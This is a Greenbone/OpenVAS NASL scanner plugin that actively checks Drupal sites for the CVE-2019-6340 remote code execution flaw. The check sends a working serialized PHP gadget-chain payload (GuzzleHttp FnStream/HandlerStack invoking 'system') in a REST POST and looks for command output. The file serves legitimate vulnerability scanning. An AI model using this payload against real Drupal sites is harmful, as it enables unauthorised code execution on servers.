# Copyright (C) 2019 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:drupal:drupal";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.142038");
  script_version("2025-02-10T05:38:01+0000");
  script_tag(name:"last_modification", value:"2025-02-10 05:38:01 +0000 (Mon, 10 Feb 2025)");
  script_tag(name:"creation_date", value:"2019-02-25 12:44:16 +0700 (Mon, 25 Feb 2019)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2025-02-07 13:15:28 +0000 (Fri, 07 Feb 2025)");

  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_cve_id("CVE-2019-6340");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Drupal RCE Vulnerability (SA-CORE-2019-003) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2019 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_drupal_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("drupal/http/detected");

  script_tag(name:"summary", value:"Drupal is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"Some field types do not properly sanitize data from non-form
  sources. This can lead to arbitrary PHP code execution in some cases.");

  script_tag(name:"affected", value:"Drupal 8.5.x and 8.6.x are known to be affected. Other versions
  might be affected as well.

  A site is only affected by this if one of the following conditions is met:

  - The site has the Drupal 8 core RESTful Web Services (rest) module enabled and allows PATCH or
  POST requests

  or

  - the site has another web services module enabled, like JSON:API in Drupal 8, or Services or
  RESTful Web Services in Drupal 7.");

  script_tag(name:"solution", value:"Update to version 8.5.11, 8.6.10 or later.");

  script_xref(name:"URL", value:"https://www.drupal.org/sa-core-2019-003");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/46452");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

cmds = exploit_commands();

url = dir + "/node/?_format=hal_json";
headers = make_array("Content-Type", "application/hal+json");
host = http_report_vuln_url(port: port, url: dir + '/rest/type/shortcut/default', url_only: TRUE);

foreach cmd (keys(cmds)) {
  data = '{\n' +
         '  "link": [\n' +
         '    {\n' +
         '      "value": "link",\n' +
         '      "options": "O:24:\\"GuzzleHttp\\\\Psr7\\\\FnStream\\":2:{s:33:\\"' +
         "\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods" +
         '\\";a:1:{s:5:\\"close\\";a:2:{i:0;O:23:\\"GuzzleHttp\\\\HandlerStack\\":3:{s:32:\\"' +
         "\u0000GuzzleHttp\\HandlerStack\u0000handler" +
         '\\";s:2:\\"' + cmds[cmd] + '\\";s:30:\\"' +
         "\u0000GuzzleHttp\\HandlerStack\u0000stack" +
         '\\";a:1:{i:0;a:1:{i:0;s:6:\\"system\\";}}s:31:\\"' +
         "\u0000GuzzleHttp\\HandlerStack\u0000cached" +
         '\\";b:0;}i:1;s:7:\\"resolve\\";}}s:9:\\"_fn_close\\";a:2:{i:0;r:4;i:1;s:7:\\"resolve\\";}}"\n' +
         '    }\n' +
         '  ],\n' +
         '  "_links": {\n' +
         '    "type": {\n' +
         '      "href": "' + host + '"\n' +
         '    }\n' +
         '  }\n' +
         '}';

  req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
  res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

  if (ereg(pattern: cmd, string: res)) {
    report = 'It was possible to execute the "' + cmds[cmd] + '" command.\n\nResult:\n\n' + res;
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(0);
